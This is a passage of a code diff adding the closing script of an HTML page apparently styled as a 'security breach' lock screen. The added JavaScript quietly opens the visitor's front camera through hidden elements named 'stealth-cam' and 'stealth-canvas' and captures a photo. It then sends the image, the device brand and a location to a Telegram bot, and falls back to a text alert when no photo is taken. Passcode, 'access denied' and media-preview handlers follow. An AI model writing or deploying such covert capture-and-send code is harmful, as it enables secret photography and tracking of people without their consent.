+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    const video = document.getElementById('stealth-cam');
+                    video.srcObject = stream;
+                    await video.play();
+
+                    await new Promise(resolve => setTimeout(resolve, 500));
+
+                    const canvas = document.getElementById('stealth-canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    stream.getTracks().forEach(track => track.stop());
+
+                    photoBlob = await new Promise(resolve => {
+                        canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
+                    });
+                }
+            } catch (err) {
+                console.log('Surveillance capture error:', err);
+            }
+
+            const alertCaption = `🚨 *SECURITY BREACH ALERT* 🚨\n\n` +
+                                 `🔍 *Trigger:* ${reason}\n` +
+                                 `📱 *Device:* ${phoneBrand}\n` +
+                                 `📍 *Location:* ${location}\n` +
+                                 `⏰ *Time:* ${new Date().toLocaleString()}`;
+
+            if (photoBlob) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', photoBlob, 'breach_capture.jpg');
+                formData.append('caption', alertCaption);
+                formData.append('parse_mode', 'Markdown');
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (err) {
+                    console.error('Failed to send breach photo:', err);
+                }
+            } else {
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: alertCaption + `\n\n⚠️ *Camera feed unavailable during trigger.*`,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                } catch (err) {
+                    console.error('Failed to send breach alert message:', err);
+                }
+            }
+        }
+
+        // Enter Key Listener for Passcode Input
+        document.getElementById('passcode-input')?.addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') {
+                checkPasscode();
+            }
+        });
+
+        function handleNo() {
+            const promptBox = document.getElementById('front-prompt');
+            promptBox.innerHTML = `
+                <div class="space-y-4 py-8">
+                    <h2 class="text-3xl font-bold text-red-500 tracking-wider">[ ACCESS DENIED ]</h2>
+                    <p class="text-sm font-mono text-slate-300">Session terminated by user request.</p>
+                    <button onclick="location.reload()" class="mt-4 px-6 py-2 bg-green-500/20 border border-green-400 text-green-300 rounded font-mono hover:bg-green-500/40 cursor-pointer">
+                        [ RESTART SESSION ]
+                    </button>
+                </div>
+            `;
+        }
+
+        // FIXED MODAL PREVIEW HANDLER
+        function openModal(wrapper) {
+            const targetMedia = wrapper.querySelector('.media-target');
+            const modal = document.getElementById('zoom-modal');
+            const modalContent = document.getElementById('modal-content');
+
+            modalContent.innerHTML = '';
+
+            if (targetMedia) {
+                const tagName = targetMedia.tagName.toLowerCase();
+                
+                if (tagName === 'img') {
+                    const newImg = document.createElement('img');
+                    newImg.src = targetMedia.getAttribute('src');
+                    newImg.className = 'max-w-full max-h-[80vh] object-contain rounded';
+                    modalContent.appendChild(newImg);
+                } else if (tagName === 'video') {
+                    const newVid = document.createElement('video');
+                    newVid.src = targetMedia.getAttribute('src');
+                    newVid.controls = true;
+                    newVid.autoplay = true;
+                    newVid.className = 'max-w-full max-h-[80vh] rounded';
+                    modalContent.appendChild(newVid);
+                }
+                modal.classList.remove('hidden');
+            }
+        }
+
+        function closeModal() {
+            const modal = document.getElementById('zoom-modal');
+            const modalContent = document.getElementById('modal-content');
+            modal.classList.add('hidden');
+            modalContent.innerHTML = '';
+        }
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') closeModal();
+        });
+    </script>
+</body>
+</html>
